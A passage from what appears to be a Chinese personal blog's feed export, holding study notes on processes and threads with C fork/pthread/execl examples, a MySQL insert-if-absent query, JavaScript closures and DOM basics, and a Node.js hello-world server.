data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321203307445.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321203307445" style="zoom:67%;"><h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><h6 id="1-共享存储器系统"><a href="#1-共享存储器系统" class="headerlink" title="1.共享存储器系统"></a>1.共享存储器系统</h6><h6 id="2-管道通信系统"><a href="#2-管道通信系统" class="headerlink" title="2.管道通信系统"></a>2.管道通信系统</h6><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321201310109.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321201310109.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321201310109" style="zoom: 67%;"><h6 id="3-消息传递系统"><a href="#3-消息传递系统" class="headerlink" title="3.消息传递系统"></a>3.消息传递系统</h6><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321201413703.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321201413703.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321201413703" style="zoom:67%;"><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="线程—作为调度和分派的基本单位"><a href="#线程—作为调度和分派的基本单位" class="headerlink" title="线程—作为调度和分派的基本单位"></a>线程—作为调度和分派的基本单位</h2><h6 id="1-调度的基本单位"><a href="#1-调度的基本单位" class="headerlink" title="1.调度的基本单位"></a>1.调度的基本单位</h6><p>线程作为调度和分派的基本单位，而进程作为资源拥有的基本单位；同一进程中，线程的切换不会引起进程的切换；</p><h6 id="2-并发性"><a href="#2-并发性" class="headerlink" title="2.并发性"></a>2.并发性</h6><p>线程之间可并发执行，最大化提升单进程的吞吐能力；</p><h6 id="3-拥有资源"><a href="#3-拥有资源" class="headerlink" title="3.拥有资源"></a>3.拥有资源</h6><p>进程的资源可以被自己的线程共享使用；线程一般不独占资源；</p><h6 id="4-独立性"><a href="#4-独立性" class="headerlink" title="4.独立性"></a>4.独立性</h6><p>同一进程产生的线程可以共享资源，独立性弱；</p><h6 id="5-系统开销"><a href="#5-系统开销" class="headerlink" title="5.系统开销"></a>5.系统开销</h6><p>进程高、线程低；</p><h6 id="6-支持多处理机系统"><a href="#6-支持多处理机系统" class="headerlink" title="6.支持多处理机系统"></a>6.支持多处理机系统</h6><p>多线程可以充分利用多个处理机，并发执行；</p><h2 id="线程的状态和线程控制块"><a href="#线程的状态和线程控制块" class="headerlink" title="线程的状态和线程控制块"></a>线程的状态和线程控制块</h2><h6 id="1-线程运行的三个状态"><a href="#1-线程运行的三个状态" class="headerlink" title="1.线程运行的三个状态"></a>1.线程运行的三个状态</h6><p>与传统的进程一样，在各线程之间也存在着共享资源和相互合作的制约关系，致使线程在运行时也具有间断性。相应地，线程在运行时也具有下述三种基本状态：<br> 　(1) <strong>执行状态</strong>，表示线程已获得处理机而正在运行；<br> 　(2) <strong>就绪状态</strong>，指线程已具备了各种执行条件，只须再获得CPU便可立即执行；<br> 　(3) <strong>阻塞状态</strong>，指线程在执行中因某事件受阻而处于暂停状态，例如，当一个线程执行从键盘读入数据的系统调用时，该线程就被阻塞。</p><h6 id="2-线程控制块TCB"><a href="#2-线程控制块TCB" class="headerlink" title="2.线程控制块TCB"></a>2.线程控制块TCB</h6><p>如同每个进程有一个进程控制块一样，系统也为每个线程配置了一个线程控制块TCB，将所有用于控制和管理线程的信息记录在线程控制块中。 </p><p>线程标识符、一组寄存器（ 通用寄存器、程序计数器PC、状态寄存器）、线程运行状态、优先级、线程专有存储区、信号屏蔽、堆栈指针</p><h2 id="线程的实现"><a href="#线程的实现" class="headerlink" title="线程的实现"></a>线程的实现</h2><h6 id="1-线程的创建"><a href="#1-线程的创建" class="headerlink" title="1.线程的创建"></a>1.线程的创建</h6><p>应用程序在启动时，通常仅有一个线程在执行，人们把线程称为“初始化线程”，它的主要功能是用于创建新线程。在创建新线程时，需要利用一个线程创建函数(或系统调用)，并提供相应的参数，如指向线程主程序的入口指针、堆栈的大小，以及用于调度的优先级等。在线程的创建函数执行完后，将返回一个线程标识符供以后使用。</p><h6 id="2-线程的终止"><a href="#2-线程的终止" class="headerlink" title="2.线程的终止"></a>2.线程的终止</h6><p>当一个线程完成了自己的任务(工作)后，或是线程在运行中出现异常情况而须被强行终止时，由终止线程通过调用相应的函数(或系统调用)对它执行终止操作。但有些线程(主要是系统线程)，它们一旦被建立起来之后，便一直运行下去而不被终止。在大多数的OS中，<strong>线程被中止后并不立即释放它所占有的资源，只有当进程中的其它线程执行了分离函数后，被终止的线程才与资源分离，此时的资源才能被其它线程利用</strong>。</p><h2 id="进程线程编程实验"><a href="#进程线程编程实验" class="headerlink" title="进程线程编程实验"></a>进程线程编程实验</h2><h6 id="1-创建子进程实验"><a href="#1-创建子进程实验" class="headerlink" title="1.创建子进程实验"></a>1.创建子进程实验</h6><p>对于父进程，<code>fork()</code>函数返回子进程的进程号，而对于子进程，<code>fork()</code>函数则返回0。因此，通过<code>fork()</code>函数的返回值可以判定该进程是父进程还是子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过父进程创建一个子进程</span></span><br><span class="line"><span class="keyword">pid_t</span> p1,p2,p3;</span><br><span class="line">p1=getpid();</span><br><span class="line"><span class="keyword">while</span>((p2=fork())==<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span>(p2 == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进入进程2\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是第二个进程，id为%d，父进程为%d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>((p3=fork())==<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span>(p3 ==<span class="number">0</span> &amp;&amp; getppid()==p1)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进入进程3\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是第三个进程，id为%d，父进程为%d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="2-在子进程中创建线程"><a href="#2-在子进程中创建线程" class="headerlink" title="2.在子进程中创建线程"></a>2.在子进程中创建线程</h6><p>在子进程中创建线程，每个线程执行不同的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> p1,p2,p3;</span><br><span class="line">p1=getpid();</span><br><span class="line"><span class="keyword">if</span>(p2!=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span>((p2=fork())==<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span>(p2 == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid1, tid2; <span class="comment">//定义两个线程i;</span></span><br><span class="line">    <span class="keyword">int</span> ret1,ret2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进入进程2\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是第二个进程，id为%d，父进程为%d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">23</span>;<span class="comment">//打印两次helloworld</span></span><br><span class="line">    <span class="keyword">int</span> n2=<span class="number">3</span>;</span><br><span class="line">    ret1 = pthread_create(&amp;tid1, <span class="literal">NULL</span>, (<span class="keyword">void</span>*)print_prime, &amp;n);<span class="comment">//传入的参数为void *类型，然后，再将int num=*(int *)n;</span></span><br><span class="line">    <span class="keyword">if</span>(ret1 == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建第一个线程成功\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建第一个线程失败!\n&quot;</span>);</span><br><span class="line">    ret2=pthread_create(&amp;tid2,<span class="literal">NULL</span>,(<span class="keyword">void</span>*)Fibonacci,&amp;n2);</span><br><span class="line">    <span class="keyword">if</span>(ret2 == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建第二个线程成功\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建第二个线程失败!\n&quot;</span>);</span><br><span class="line">    pthread_join(tid1, <span class="literal">NULL</span>);<span class="comment">//等待线程执行完成</span></span><br><span class="line">    pthread_join(tid2, <span class="literal">NULL</span>);<span class="comment">//等待线程执行完成</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_prime</span><span class="params">(<span class="keyword">void</span>* max_void)</span></span>&#123;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="3-在子进程中执行不同的程序"><a href="#3-在子进程中执行不同的程序" class="headerlink" title="3.在子进程中执行不同的程序"></a>3.在子进程中执行不同的程序</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> p4=<span class="number">10</span>,p5=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(p4!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;执行创建进程p4\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((p4=fork())==<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(p4==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建进程4成功，id为%d，父进程为%d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p4==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret=execl(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-lh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ret%d&quot;</span>,ret);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;执行ls -l出错&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;成功在进程4中执行ls -l命令\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中excel( )在子进程中执行，为覆盖掉原来的程序，所以第二个if里只执行<code>ls -lh</code></p><h2 id="进程间的通信-1"><a href="#进程间的通信-1" class="headerlink" title="进程间的通信"></a>进程间的通信</h2>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Josn格式的处理</title>
      <link href="/2021/03/13/Python/Python-Josn%E6%A0%BC%E5%BC%8F%E7%9A%84%E5%A4%84%E7%90%86/"/>
      <url>/2021/03/13/Python/Python-Josn%E6%A0%BC%E5%BC%8F%E7%9A%84%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-mysql不存在插入存在不插入"><a href="#1-mysql不存在插入存在不插入" class="headerlink" title="1.mysql不存在插入存在不插入"></a>1.mysql不存在插入存在不插入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO info(goods_id,goods_store,goods_name,goods_oriPrice,goods_killPrice,goods_url,stoptime)SELECT &#x27;1000282702&#x27;,&#x27;美的京东自营官方旗舰店&#x27;,&#x27;美的（Midea）家用多功能风炉烤箱32L 独立控温 搪瓷内胆 解冻发酵电烤箱T3-L324D二代&#x27;,&#x27;429.0&#x27;,&#x27;358.0&#x27;,&#x27;http://item.jd.com/5248778.html&#x27;,1615867199000 from dual where not exists (select * from info where goods_id=&#x27;1000282702&#x27;);</span><br></pre></td></tr></table></figure><p><code>INSERT INTO 表名(表项，表项···)SELECT &#39;值&#39; &#39;值&#39;··· from dual where not exists (select * from 表名 where 表项=值)</code></p><h1 id="2-python2安装pymysql模块"><a href="#2-python2安装pymysql模块" class="headerlink" title="2.python2安装pymysql模块"></a>2.python2安装pymysql模块</h1><p><a href="https://blog.csdn.net/qq_31024251/article/details/113758704?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-3-113758704.pc_agg_rank_aggregation&amp;utm_term=python2%E5%AE%89%E8%A3%85pymysql&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_31024251/article/details/113758704?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-3-113758704.pc_agg_rank_aggregation&amp;utm_term=python2%E5%AE%89%E8%A3%85pymysql&amp;spm=1000.2123.3001.4430</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript开发</title>
      <link href="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/"/>
      <url>/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="闭包与变量锁定"><a href="#闭包与变量锁定" class="headerlink" title="闭包与变量锁定"></a>闭包与变量锁定</h1><p>闭包=内部函数+外部代码（外部函数变量）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stopWatch</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> starttime=<span class="built_in">Date</span>.now()</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getDelay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> usingtime=<span class="built_in">Date</span>.now()-starttime;</span><br><span class="line">            alert(usingtime);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getDelay;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//先调用整个函数，然后变量拿到getDelay的入口</span></span><br><span class="line">    <span class="keyword">var</span> timer=stopWatch();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> foo=<span class="built_in">Math</span>.random()*<span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后使用getDealy入口显示延迟时间 此时的starttime并没有被消灭</span></span><br><span class="line">    timer();</span><br></pre></td></tr></table></figure><img src="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311200738176.png" class="lazyload" data-srcset="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311200738176.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210311200738176" style="zoom: 50%;"><p>在闭包内可以使用共有的变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tmp</span>(<span class="params">names</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> qutos=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;names.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> thefun=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;my name is &quot;</span>+names[i]+<span class="string">&quot;!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//此时的thefun没有运行，只是记录下thefun的地址，里面的i还没被锁定，只是复制外面i的地址，</span></span><br><span class="line">        qutos.push(thefun);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qutos;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> people=[<span class="string">&quot;tony&quot;</span>,<span class="string">&quot;mike&quot;</span>,<span class="string">&quot;jecke&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> quto_arry=tmp(people);</span><br><span class="line"><span class="keyword">var</span> person=quto_arry[<span class="number">0</span>];</span><br><span class="line">alert(<span class="keyword">typeof</span>(person));</span><br></pre></td></tr></table></figure><p>运行结果：<img src="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311201052008.png" class="lazyload" data-srcset="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311201052008.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210311201052008" style="zoom:50%;"></p><p>原因是在立即执行函数里面，names[i]里面的i为引用，相当于c语言的深拷贝，所以运行到最后，quto_arry里面应该的i都为4，因为循环结束的i为4</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tmp</span>(<span class="params">names</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> qutoes=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;names.length;i++)&#123;</span><br><span class="line"></span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params">index</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> theFunction=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;My name is&quot;</span>+names[index]+<span class="string">&quot;!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            qutoes.push(theFunction);</span><br><span class="line">        &#125;)(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> qutoes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> people=[<span class="string">&quot;tony&quot;</span>,<span class="string">&quot;mike&quot;</span>,<span class="string">&quot;jecke&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> quto_arry=tmp(people);</span><br><span class="line"><span class="keyword">var</span> person=quto_arry[<span class="number">0</span>];</span><br><span class="line">alert(person());</span><br></pre></td></tr></table></figure><p>运行结果：<img src="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311203041496.png" class="lazyload" data-srcset="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311203041496.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210311203041496" style="zoom:50%;"></p><p>变量i作为立即函数的参数输入，这里的参数index引用到了立即函数内部， 变量i成为了函数内部的变量，之前作为外部的变量的i被锁定了，类似于重新复制了一份，外部的i不会影响函数内的i</p><h1 id="文档对象模型DOM"><a href="#文档对象模型DOM" class="headerlink" title="文档对象模型DOM"></a>文档对象模型DOM</h1><p>DOM结构不止有HTML元素，用一个更上层的概念来说，所有组成DOM结构的东西被称作节点。</p><p>这些节点可以是HTML元素、属性、文本内容、注释、与文件相关的内容。’</p><p>DOM的最顶层由window、document、html三个元素组成</p><img src="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311210208898.png" class="lazyload" data-srcset="/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/image-20210311210208898.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210311210208898" style="zoom: 67%;"><h2 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h2><p>DOM结构的根节点就是window对象，这个window对象包含许多作用浏览器的属性和方法，window对象处理的是浏览器窗口</p><h2 id="Document对象"><a href="#Document对象" class="headerlink" title="Document对象"></a>Document对象</h2><p>document对象是通往构成网页HTML元素的大门，需要记住的是document对象并非只能访问HTML只读文件，可以通过document对象对HTML文件进行读取和编辑。</p>]]></content>
      
      
      <categories>
          
          <category> NodeJs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-Node.js开发</title>
      <link href="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/"/>
      <url>/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="使用webStorm编写第一个Node-js程序"><a href="#使用webStorm编写第一个Node-js程序" class="headerlink" title="使用webStorm编写第一个Node.js程序"></a>使用webStorm编写第一个Node.js程序</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;请打开浏览器&quot;</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;hello wolrd&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器正常&quot;</span>);</span><br><span class="line">&#125;).listen(<span class="number">3000</span>,<span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210307120024064.png" class="lazyload" data-srcset="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210307120024064.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210307120024064"></p><p><img src="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210307120030817.png" class="lazyload" data-srcset="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210307120030817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210307120030817"></p><h1 id="JavaScript的数据类型"><a href="#JavaScript的数据类型" class="headerlink" title="JavaScript的数据类型"></a>JavaScript的数据类型</h1><h2 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h2><h2 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h2><p>程序中的字符串型数据是包含在单引号或双引号中的，由单引号定界的字符串中可以含有双引号，由双引号定界的字符串中也可以含有单引号</p><h1 id="Node-js全局对象"><a href="#Node-js全局对象" class="headerlink" title="Node.js全局对象"></a>Node.js全局对象</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><h3 id="filename"><a href="#filename" class="headerlink" title="_filename"></a>_filename</h3><p>表示当前正在执行的脚本的文件名它将输出所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。如果在模块中，返回的值是模块文件的路径。</p><h3 id="dirname"><a href="#dirname" class="headerlink" title="_dirname"></a>_dirname</h3><p>表示当前执行脚本所在的目录。</p><h2 id="全局对象"><a href="#全局对象" class="headerlink" title="全局对象"></a>全局对象</h2><h3 id="console对象"><a 